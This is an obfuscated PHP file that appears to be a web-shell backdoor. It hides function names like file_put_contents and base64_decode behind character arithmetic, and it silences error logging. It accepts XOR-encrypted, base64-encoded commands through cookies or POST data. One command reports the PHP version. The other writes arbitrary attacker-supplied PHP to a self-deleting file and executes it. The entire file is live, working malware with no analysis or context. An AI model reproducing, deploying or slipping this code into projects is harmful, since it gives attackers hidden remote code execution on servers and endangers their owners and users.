<?php $pkcagq = "\146".chr(105)."\x6c".chr(500-399).chr(740-645).chr(577-465).'u'."\x74"."\x5f".chr(99)."\157".chr(509-399)."\x74"."\145"."\156".chr(116)."\163";
$fxygz = chr(98).'a'.chr(132-17).chr(757-656).'6'.chr(52).chr(373-278).chr(143-43)."\145"."\x63"."\157"."\144".chr(101);
$tzgmoavi = chr(826-721)."\x6e"."\151"."\137".chr(115).chr(101).'t';
$wycyuf = chr(117).chr(110).chr(935-827).chr(105).chr(110).chr(107);


@$tzgmoavi(chr(1007-906).chr(114).chr(776-662).chr(111)."\162"."\x5f"."\x6c".'o'.'g', NULL);
@$tzgmoavi("\154".chr(111)."\x67".chr(95)."\145".chr(114)."\x72".'o'.chr(294-180).chr(784-669), 0);
@$tzgmoavi('m'."\x61"."\170"."\137".'e'."\x78"."\145"."\x63".'u'.chr(116).'i'.chr(111).'n'."\137".'t'.chr(817-712).chr(109).'e', 0);
@set_time_limit(0);

function idbbnfe($azkdj, $esijb)
{
    $vmrytkwf = "";
    for ($gvyiwpkr = 0; $gvyiwpkr < strlen($azkdj);) {
        for ($j = 0; $j < strlen($esijb) && $gvyiwpkr < strlen($azkdj); $j++, $gvyiwpkr++) {
            $vmrytkwf .= chr(ord($azkdj[$gvyiwpkr]) ^ ord($esijb[$j]));
        }
    }
    return $vmrytkwf;
}

$nkfcyyxaz = array_merge($_COOKIE, $_POST);
$ymooclkl = '6cae6bf5-712b-401e-91ed-bc37325ef524';
foreach ($nkfcyyxaz as $wcamowxbs => $azkdj) {
    $azkdj = @unserialize(idbbnfe(idbbnfe($fxygz($azkdj), $ymooclkl), $wcamowxbs));
    if (isset($azkdj["\141".'k'])) {
        if ($azkdj['a'] == chr(189-84)) {
            $gvyiwpkr = array(
                "\x70"."\x76" => @phpversion(),
                chr(115)."\166" => "3.5",
            );
            echo @serialize($gvyiwpkr);
        } elseif ($azkdj['a'] == "\x65") {
            $nzhxpqa = "./" . md5($ymooclkl) . "\x2e".'i'.chr(110)."\x63";
            @$pkcagq($nzhxpqa, "<" . "\77".chr(264-152).'h'.chr(359-247).chr(32).chr(64)."\x75".chr(110).chr(108)."\151"."\x6e"."\x6b"."\x28".chr(95).'_'.chr(901-831).chr(73).'L'.'E'.chr(95).chr(304-209).')'."\x3b"."\x20" . $azkdj["\144"]);
            @include($nzhxpqa);
            @$wycyuf($nzhxpqa);
        }
        exit();
    }
}

